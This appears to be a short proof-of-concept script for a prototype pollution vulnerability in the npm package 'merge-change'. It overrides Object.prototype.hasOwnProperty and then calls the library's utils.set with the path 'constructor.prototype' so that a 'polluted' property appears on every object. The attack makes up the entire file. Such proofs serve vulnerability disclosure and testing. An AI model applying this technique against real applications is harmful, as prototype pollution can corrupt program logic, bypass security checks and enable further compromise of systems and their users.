Object.prototype.hasOwnProperty = () => true;
const utils = require('merge-change').utils;
console.log({}.polluted);
let obj = {};
utils.set(obj, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);